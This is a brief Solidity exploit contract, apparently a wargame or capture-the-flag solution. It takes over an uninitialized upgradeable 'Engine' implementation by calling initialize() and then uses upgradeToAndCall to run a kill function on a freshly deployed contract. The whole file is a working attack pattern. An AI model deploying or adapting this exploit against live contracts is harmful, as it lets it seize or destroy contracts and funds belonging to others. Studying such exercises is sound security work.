// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Target.sol";
import "./OurEngine.sol";

contract Attack {
    Engine public engine;

    constructor(address engine_addr) {
        engine = Engine(payable(engine_addr));
    }

    function attack() payable public 
    {
        OurEngine da_bomb;

        da_bomb = new OurEngine();
        engine.initialize();
        engine.upgradeToAndCall(address(da_bomb), abi.encodeWithSelector(da_bomb.kill.selector));
    }
}